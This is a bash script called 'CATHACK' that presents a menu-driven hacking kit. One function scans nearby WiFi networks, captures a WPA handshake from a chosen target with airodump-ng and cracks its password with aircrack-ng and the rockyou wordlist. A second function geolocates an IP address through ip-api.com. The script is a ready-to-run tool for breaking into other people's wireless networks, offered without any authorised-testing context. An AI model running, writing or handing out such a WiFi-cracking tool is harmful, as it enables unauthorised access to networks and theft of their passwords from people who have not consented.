#!/bin/bash
# CATHACK - Made by Flepo - v1.0
# Root required

# Splash screen
clear
echo "=================================="
echo "          CATHACK"
echo "       Made by Flepo v1.0"
echo "=================================="
sleep 2

# Function: WiFi Finder & Cracker
wifi_crack() {
    clear
    echo "[*] Scanning for available WiFi networks..."
    iw dev wlan0 scan | grep 'SSID:' | sed 's/SSID: //' | sort -u > /tmp/wifi_list.txt

    if [ ! -s /tmp/wifi_list.txt ]; then
        echo "❌ No WiFi networks found."
        sleep 2
        return
    fi

    echo ""
    echo "Available Networks:"
    nl -w2 -s". " /tmp/wifi_list.txt
    echo ""
    read -p "Select network number: " choice
    ssid=$(sed -n "${choice}p" /tmp/wifi_list.txt)

    if [ -z "$ssid" ]; then
        echo "❌ Invalid choice."
        sleep 2
        return
    fi

    bssid=$(iw dev wlan0 scan | grep -B5 "SSID: $ssid" | grep BSS | awk '{print $2}' | head -n1)
    channel=$(iw dev wlan0 scan | grep -A5 "SSID: $ssid" | grep 'DS Parameter set' | awk '{print $4}' | head -n1)

    echo "[*] Target: $ssid"
    echo "[*] BSSID: $bssid"
    echo "[*] Channel: $channel"

    mkdir -p /tmp/catprompt
    echo "[*] Starting handshake capture..."
    timeout 60 airodump-ng --bssid "$bssid" --channel "$channel" --write /tmp/catprompt/handshake wlan0

    echo "[*] Attempting password crack with rockyou.txt..."
    aircrack-ng /tmp/catprompt/handshake-01.cap -w rockyou.txt
}

# Function: IP Information
ip_info() {
    clear
    read -p "Enter IP address: " ipaddr
    if [[ "$ipaddr" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        echo "[*] Fetching information for $ipaddr..."
        echo ""
        curl -s "http://ip-api.com/json/$ipaddr?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query" | jq
    else
        echo "❌ Invalid IP format."
    fi
    echo ""
    read -p "Press Enter to return to menu..."
}

# Main menu loop
while true; do
    clear
    echo "=================================="
    echo "          CATHACK"
    echo "       Made by Flepo v1.0"
    echo "=================================="
    echo ""
    echo "1. Find & crack WiFi password (root required)"
    echo "2. Get full IP information"
    echo "0. Exit"
    echo ""
    read -p "Choose an option: " opt
    case $opt in
        1) wifi_crack ;;
        2) ip_info ;;
        0) clear; exit ;;
        *) echo "❌ Invalid option."; sleep 2 ;;
    esac
done
